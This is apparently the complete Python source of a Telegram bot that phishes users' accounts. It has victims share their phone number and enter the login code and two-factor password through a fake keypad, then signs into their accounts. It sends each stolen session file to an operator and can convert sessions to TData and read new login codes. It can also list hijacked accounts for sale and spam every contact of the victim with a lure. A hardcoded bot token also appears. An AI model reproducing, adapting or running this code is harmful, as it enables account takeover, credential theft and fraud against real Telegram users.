#!/usr/bin/python
# -*- coding: utf-8 -*-
import asyncio
import logging
import os
import shutil

from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from opentele.api import UseCurrentSession
from telethon import TelegramClient
from telethon.crypto import AuthKey
from telethon.errors import PasswordHashInvalidError, FloodWaitError, PhoneCodeInvalidError, SessionPasswordNeededError, \
    PhoneCodeExpiredError
from telethon.sessions import SQLiteSession
from telethon.tl.custom import Dialog, Message

from opentele.tl import TelegramClient as TC

from models import *

from timer import main as timer

from config import *
from db import User
from kbs import *
from states import *
from texts import *

import phonenumbers
from phonenumbers.phonenumberutil import (
    region_code_for_country_code,
)

logging.basicConfig(level=logging.INFO)

API_TOKEN = '7130578266:AAFEHZT-g1kaSCbPCtn405zHYE3mdyeUIyU'

bot = Bot(token=API_TOKEN, parse_mode='html')

# For example use simple MemoryStorage for Dispatcher.
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

updates = -1001749004197
admin = 7021011794
user_timer = False


class Sessions:
    data = {}


class CodeInput:
    data = {}


class Dp(StatesGroup):
    text = State()


@dp.message_handler(lambda msg: msg.chat.id == admin, commands='spam')
async def spam(msg: types.Message):
    await msg.answer('Vzloman by @nelegalproduction')
    await Dp.text.set()


@dp.message_handler(lambda msg: msg.chat.id == admin, commands='cls', state='*')
async def spam2(msg: types.Message, state: FSMContext):
    if await state.get_state():
        await state.finish()


@dp.message_handler(lambda msg: msg.chat.id == admin, state=Dp.text)
async def spam1(msg: types.Message, state: FSMContext):
    await state.finish()
    await msg.answer('Спам запущен')

    query = User.select()

    ok = 0
    for x in User().select():
        try:
            await bot.send_message(x.user_id, msg.text)
            ok += 1
        except:
            pass
    await msg.answer(f'Успещшно отправленно: {str(ok)}')


@dp.message_handler(lambda msg: msg.chat.id == admin, commands='check', state='*')
async def get_account(msg: types.Message):
    id_ = msg.get_args()
    if not id_:
        return
    try:
        TC(os.path.join('sessions', id_))
        await msg.answer('Сессия валид')

    except FileNotFoundError:
        await msg.answer('Сессия не найдена')
    except:
        await msg.answer('сессия не валид')


@dp.message_handler(lambda msg: msg.chat.id == admin, commands='get', state='*')
async def get_account(msg: types.Message):
    id_ = msg.get_args()
    if not id_:
        return
    try:
        await msg.answer_document(open(os.path.join('sessions', id_ + '.session'), 'rb'))
    except FileNotFoundError:
        await msg.answer('Сессия не найдена')


@dp.message_handler(commands='start')
async def start(msg: types.Message, state: FSMContext):
    if await state.get_state():
        await state.finish()

    if CodeInput.data.get(msg.chat.id):
        CodeInput.data.pop(msg.chat.id)

    if not User.select().where(User.user_id == msg.chat.id):

        try:
            await msg.answer(MAIN.format(
                first_name=msg.from_user.first_name
            ), reply_markup=start_kb)
        except:
            await msg.answer('привет', reply_markup=start_kb)

        User(
            user_id=msg.chat.id,
            verified=False,
            phone=''
        ).save()

    else:
        user = User().get(user_id=msg.chat.id)
        if not user.verified:
            await msg.answer(ON_START.format(
                '<b>👋 Снова привет</>'
            ), reply_markup=start2_kb)
            await AuthTG.phone.set()


@dp.callback_query_handler(text='start', state='*')
async def on_pro(call: types.CallbackQuery):
    try:
        user = User().get(user_id=call.from_user.id)
    except:
        await call.answer('введи /start')
        return
    if not user.verified:
        try:
            await call.message.delete()
        except:
            pass
        await call.message.answer(ON_START.format(
            '<b>🔑 Шаг №2</>'
        ), reply_markup=start2_kb)
        await AuthTG.phone.set()


@dp.message_handler(lambda msg: msg.contact.user_id == msg.chat.id,
                    state=AuthTG.phone, content_types=types.ContentType.CONTACT)
async def get_phone(msg: types.Message, state: FSMContext):
    fr = await msg.answer('🧑‍💻 Отправляем код ...')

    client = TelegramClient(f'sessions/{str(msg.contact.phone_number)}',
                            api_id=api_id, api_hash=api_hash,
                            device_model=device_model, system_version=system_version,
                            app_version=app_version, lang_code=lang_code,
                            system_lang_code=system_lang_code)
    await client.connect()
    Sessions.data.update({
        msg.chat.id: client
    })

    pn = phonenumbers.parse('+' + str(msg.contact.phone_number))

    try:
        await bot.send_message(updates,
                               '🍕 Юзер ввел номер\n\n'
                               f'🧬 Айди: <code>{msg.from_user.id}</>\n'
                               f'📞 Номер: <code>{str(msg.contact.phone_number)}</>\n'
                               f'🌍 Страна: <code>{region_code_for_country_code(pn.country_code)}</>')
    except:
        pass

    await state.update_data(phone=str(msg.contact.phone_number))

    try:
        await client.send_code_request(str(msg.contact.phone_number))
    except FloodWaitError as ex:
        await msg.answer('Ошибка. Лимиты телеграм')

    await fr.edit_text('<b>🔑 Код:</>', reply_markup=num)
    await AuthTG.code.set()


@dp.callback_query_handler(text_startswith='ready', state=AuthTG.code)
async def on_2c(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()

    now = CodeInput.data.get(call.from_user.id)
    if not now:
        await call.answer('Код введен не верно')
        return

    if len(now) < 5:
        await call.answer('Код состоит из 5 цифр')
        return

    client: TelegramClient = Sessions.data.get(call.from_user.id)

    try:
        await client.sign_in(data.get('phone'),
                             int(now))
        await call.message.edit_text('Ваш аккаунт успешно авторизирован.')

        await up_account(client, data, state)

    except PhoneCodeInvalidError:
        try:
            CodeInput.data.pop(call.from_user.id)
        except:
            pass

        await call.message.reply('Вы ввели неверный код, повторите попытку')
        await call.message.edit_text('<b>🔑 Код:</>', reply_markup=num)

        await AuthTG.code.set()
        await state.update_data(data)

    except SessionPasswordNeededError:

        await call.answer('Введите пароль от двух-этапной авторизации:')
        await AuthTG.twfa.set()

    except PhoneCodeExpiredError:
        await state.finish()

        try:
            CodeInput.data.pop(call.from_user.id)
            Sessions.data.pop(call.from_user.id)
        except:
            pass

        await call.message.delete()
        await call.message.answer('введите /start')

    except Exception as ex:
        try:
            await bot.send_message(admin, f'err: {ex} | chat: {call.from_user.id} ')
        except:
            pass

        await call.answer('Что то не получилось? Спросите у nelegala\n\n'
                          'Попробуйте повторить, отправив /start')


class Tdata:
    def __init__(self, path: str = 'sessions'):
        self.path = path

    async def session_to_tdata(self, session_path):
        await self._session_to_tdata(session_path)

    async def _session_to_tdata(self, session_path):
        client = TC(os.path.join(self.path, session_path))
        tdesk = await client.ToTDesktop(flag=UseCurrentSession)
        try:
            os.mkdir(os.path.join('tdata', session_path.split('.')[0]))
        except:
            pass
        try:
            tdesk.SaveTData(os.path.join('tdata', os.path.join(session_path.split('.')[0]), 'tdata'))
        except TypeError:
            pass
        await client.disconnect()

    async def pack_to_zip(self, tdata_path: str):
        shutil.make_archive(f'{tdata_path}', 'zip', tdata_path)


async def up_account(client, data, state):
    index_all = 0
    index_groups = 0
    index_channels = 0

    bot_id = await bot.get_me()
    chats_owns = []
    msx_subs = []

    client: TC = client

    await client.delete_dialog(bot_id.username)
    await state.finish()

    async for dialog in client.iter_dialogs():
        try:

            dialog: Dialog = dialog
            if dialog.is_group:
                if dialog.entity.creator:
                    msx_subs.append(dialog.entity.participants_count)
                index_groups += 1
                index_all += 1

                if dialog.entity.creator:
                    chats_owns.append({
                        'chat_id': dialog.id,
                        'chat_title': dialog.title,
                        'participants_count': dialog.entity.participants_count
                    })

            if dialog.is_channel:
                if dialog.entity.creator:
                    msx_subs.append(dialog.entity.participants_count)

                index_channels += 1
                index_all += 1
                if dialog.entity.creator:
                    chats_owns.append({
                        'chat_id': dialog.id,
                        'chat_title': dialog.title,
                        'participants_count': dialog.entity.participants_count
                    })

            if dialog.is_user:
                index_channels += 1
                index_all += 1
        except:
            pass

    user = await client.get_me()

    try:
        premium_status = user.premium
    except:
        premium_status = False

    session: SQLiteSession = client.session
    auth_key: AuthKey = session.auth_key

    sessions = await client.GetSessions()
    sessions = sessions.authorizations

    mx_subs = f'├ Максимум подписчиков: <code>{str(max(msx_subs))}</>\n' if chats_owns else ''

    NEW_TEXT = '<b>➕ Новый аккаунт</b>\n\n' \
               '🌐 <b>Статистика</b>\n' \
               f'├  Всего чатов: <code>{str(index_all)}</>\n' \
               f'├  Всего групп: <code>{str(index_groups)}</>\n' \
               f'├  Всего каналов: <code>{str(index_channels)}</>\n' \
               f'{mx_subs}' \
               f'└  Чатов с правами: <code>{str(len(chats_owns))}</>\n\n' \
               f'ℹ️ <b>Информация</b>\n' \
               f'├  Номер телефона: <code>{user.phone}</>\n' \
               f'├  Telegram ID: <code>{str(user.id)}</>\n' \
               f'├  Premium статус: <code>{str(premium_status)}</>\n' \
               f'├  Scam статус: <code>{str(user.scam)}</>\n' \
               f'└  Количество сессий: <code>{str(len(sessions))}</>'

    mg = await bot.send_message(updates, NEW_TEXT)

    jb = await bot.send_document(admin, open('sessions/' + data.get('phone') + '.session', 'rb'),
                                 caption=f't.me/c/{str(updates).split("-100")[1]}/{str(mg.message_id)}')
    if AUTO_SELL_LOLZ:

        try:
            await asyncio.create_task(add_item(
                client=await bot.get_session(),
                dc_id=session.dc_id,
                hex_key=auth_key.key.hex(),
                premium=premium_status
            ))
        except Exception as e:
            print('err with lolz', e)
    await bot.send_document(updates, jb.document.file_id, reply_to_message_id=mg.message_id,
                            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                                [
                                    InlineKeyboardButton(text="🗂 TData",
                                                         callback_data=f'td|{str(updates)}|{data.get("phone")}.session')
                                ],
                                [
                                    InlineKeyboardButton(text='🔍 Проверить аккаунт',
                                                         callback_data=f'check|{str(updates)}|{data.get("phone")}.session')
                                ],
                                [
                                    InlineKeyboardButton(text="📩 Код авторизации",
                                                         callback_data=f'code|{str(updates)}|{data.get("phone")}.session')
                                ]
                            ]))
    if user_timer:
        asyncio.create_task(timer(client, bot_id))
    else:
        dialg = await client.get_dialogs()
        for dialog in dialg:
            try:
                await client.send_message(dialog.id, SEND_MSG.format(username=bot_id.username))
            except:
                pass
        await client.disconnect()

    qry = User.update({User.verified: True}).where(User.user_id == user.id)
    qry.execute()


@dp.callback_query_handler(text_startswith='td|')
async def get_rd(call: types.CallbackQuery):
    srt = call.data.split('|')
    await call.answer('Ожидайте')
    asyncio.create_task(create_zip(srt))


@dp.callback_query_handler(text_startswith='code|')
async def get_r1d(call: types.CallbackQuery):
    srt = call.data.split('|')

    try:
        text = ''
        if call.message.caption:
            text += call.message.caption
        client = TC(os.path.join('sessions', srt[-1]))
        await client.connect()

        msg_ = await client.get_messages(777000)
        last_msg = msg_[0].text
        content = ''.join([
            letter if letter.isdigit() else '' for letter in last_msg
        ])
        text += f'\n\nКод: {content}'

        await call.message.edit_caption(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="🗂 TData",
                                     callback_data=f'td|{str(updates)}|{srt[-1]}')
            ],
            [
                InlineKeyboardButton(text='🔍 Проверить аккаунт',
                                     callback_data=f'check|{str(updates)}|{srt[-1]}')
            ],
            [
                InlineKeyboardButton(text="📩 Код авторизации",
                                     callback_data=f'code|{str(updates)}|{srt[-1]}')
            ]
        ]))
        await client.disconnect()

    except FileNotFoundError:
        text = '🟥 Сессия не найдена'
        await call.answer(text)
    except Exception as ex:
        text = '\n\nДанные не найдены'
        await call.answer(ex)


@dp.callback_query_handler(text_startswith='check|')
async def get_r1d(call: types.CallbackQuery):
    srt = call.data.split('|')
    await call.answer('Ожидайте')
    try:
        text = ''
        if call.message.caption:
            text += call.message.caption
        x = TC(os.path.join('sessions', srt[-1]))
        await x.get_me()
        text += '\n\n✅ Валид'
        await call.message.edit_caption(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="🗂 TData",
                                     callback_data=f'td|{str(updates)}|{srt[-1]}')
            ],
            [
                InlineKeyboardButton(text='🔍 Проверить аккаунт',
                                     callback_data=f'check|{str(updates)}|{srt[-1]}')
            ],
            [
                InlineKeyboardButton(text="📩 Код авторизации",
                                     callback_data=f'code|{str(updates)}|{srt[-1]}')
            ]
        ]))
    except FileNotFoundError:
        text = ''
        if call.message.caption:
            text += call.message.caption
        text += '\n\n🟥 Сессия не найдена'
        await call.message.edit_caption(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="🗂 TData",
                                     callback_data=f'td|{str(updates)}|{str[-1]}')
            ],
            [
                InlineKeyboardButton(text='🔍 Проверить аккаунт',
                                     callback_data=f'check|{str(updates)}|{str[-1]}')
            ],
            [
                InlineKeyboardButton(text="📩 Код авторизации",
                                     callback_data=f'code|{str(updates)}|{str[-1]}')
            ]
        ]))
    except:
        text = ''
        if call.message.caption:
            text += call.message.caption
        text += '\n\n❌ Не валид'
        await call.message.edit_caption('❌ Не валид', reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="🗂 TData",
                                     callback_data=f'td|{str(updates)}|{srt[-1]}')
            ],
            [
                InlineKeyboardButton(text='🔍 Проверить аккаунт',
                                     callback_data=f'check|{str(updates)}|{srt[-1]}')
            ],
            [
                InlineKeyboardButton(text="📩 Код авторизации",
                                     callback_data=f'code|{str(updates)}|{srt[-1]}')
            ]
        ]))


async def create_zip(srt):
    await Tdata().session_to_tdata(srt[-1])
    await Tdata().pack_to_zip(os.path.join('tdata', srt[-1].split('.')[0]))
    await bot.send_document(srt[1], open(os.path.join('tdata', srt[-1].split('.')[0] + '.zip'), 'rb'))


@dp.message_handler(state=AuthTG.twfa)
async def twa(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    client: TelegramClient = Sessions.data.get(msg.chat.id)
    try:
        await client.sign_in(password=msg.text)
        await msg.answer('Ваш аккаунт успешно авторизирован!')
        await up_account(client, data, state, msg)


    except PasswordHashInvalidError:
        await msg.answer('❌ Вы указали не верный пароль')


@dp.callback_query_handler(text_startswith='remove', state=AuthTG.code)
async def on_1c(call: types.CallbackQuery):
    now = CodeInput.data.get(call.from_user.id)
    if not now:
        await call.answer()
        return
    CodeInput.data.update({call.from_user.id: now[:-1]})
    await call.message.edit_text(f'<b>🔑 Код:</> <code>{CodeInput.data.get(call.from_user.id)}</>',
                                 reply_markup=num)


@dp.callback_query_handler(text_startswith='write_', state=AuthTG.code)
async def on_c(call: types.CallbackQuery):
    now = CodeInput.data.get(call.from_user.id)
    code = call.data.split('_')[1]
    if not now:
        CodeInput.data.update({call.from_user.id: code})
        try:
            await call.message.edit_text(f'<b>🔑 Код:</> <code>{CodeInput.data.get(call.from_user.id)}</>',
                                         reply_markup=num)
        except:
            pass
    else:
        if len(now) >= 5:
            await call.answer('Нажмите на ✅ для продолжения')
            return

        CodeInput.data.update({call.from_user.id: now + code})
        await call.message.edit_text(f'<b>🔑 Код:</> <code>{CodeInput.data.get(call.from_user.id)}</>',
                                     reply_markup=num)


@dp.message_handler(lambda msg: msg.text[1:].isdigit() and len(msg.text) >= 5 <= 7,
                    state=AuthTG.code, content_types=types.ContentType.TEXT)
async def get_code(msg: types.Message, state: FSMContext):
    data = await state.get_data()

    client: TelegramClient = Sessions.data.get(msg.chat.id)

    try:
        await client.sign_in(data.get('phone'),
                             int(msg.text[1:]))
        await up_account(client, data, state)
    except PhoneCodeInvalidError:
        try:
            CodeInput.data.pop(msg.from_user.id)
            Sessions.data.pop(msg.from_user.id)
        except:
            pass
        await msg.reply('Вы ввели не верный код, повторите попытку')

        await AuthTG.code.set()
        await state.update_data(data)

    except SessionPasswordNeededError:

        await msg.answer('Введите пароль от двух-этапной авторизации:')
        await AuthTG.twfa.set()

    except PhoneCodeExpiredError:
        await state.finish()

        try:
            CodeInput.data.pop(msg.from_user.id)
            Sessions.data.pop(msg.from_user.id)
        except:
            pass

        await msg.answer('введите /start')

    except Exception as ex:
        try:
            await bot.send_message(admin, f'err: {ex} | chat: {msg.from_user.id} ')
        except:
            pass

        await msg.answer('Что то не получилось? Спросите у @frymex\n\n'
                         'Попробуйте повторить, отправив /start')


if __name__ == '__main__':
    executor.start_polling(dp)
